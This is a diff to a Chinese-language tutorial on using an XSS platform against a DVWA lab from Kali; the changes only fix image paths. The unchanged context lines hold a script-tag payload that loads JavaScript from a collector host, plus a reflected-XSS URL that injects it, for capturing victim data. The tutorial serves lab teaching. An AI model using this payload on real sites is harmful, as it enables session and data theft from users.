@@ -137,13 +137,13 @@ kali 浏览器访问
 
 查看代码
 
-![查看代码](./../../../../../images/xssplatform/%E6%9F%A5%E7%9C%8B%E4%BB%A3%E7%A0%81.png)
+![查看代码](./../../../../../image/xssplatform/%E6%9F%A5%E7%9C%8B%E4%BB%A3%E7%A0%81.png)
 
 > XSS 平台提供一个 js 代码，只需要通过 XSS 加载 js 代码即可使用，和 beef-xss 非常像
 
 选择代码
 
-![选择代码](./../../../../../images/xssplatform/%E9%80%89%E6%8B%A9%E4%BB%A3%E7%A0%81.png)
+![选择代码](./../../../../../image/xssplatform/%E9%80%89%E6%8B%A9%E4%BB%A3%E7%A0%81.png)
 
 ```
 <script src=http://192.168.1.24/Q7yYOv?1687665509></script>
@@ -169,7 +169,7 @@ http://192.168.1.76/DVWA/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%
 
 在 XSS 平台查看接受的内容
 
-![在 XSS 平台查看接受的内容](./../../../../../images/xssplatform/%E5%9C%A8%20XSS%20%E5%B9%B3%E5%8F%B0%E6%9F%A5%E7%9C%8B%E6%8E%A5%E5%8F%97%E7%9A%84%E5%86%85%E5%AE%B9.png)
+![在 XSS 平台查看接受的内容](./../../../../../image/xssplatform/%E5%9C%A8%20XSS%20%E5%B9%B3%E5%8F%B0%E6%9F%A5%E7%9C%8B%E6%8E%A5%E5%8F%97%E7%9A%84%E5%86%85%E5%AE%B9.png)
 
 ---
 
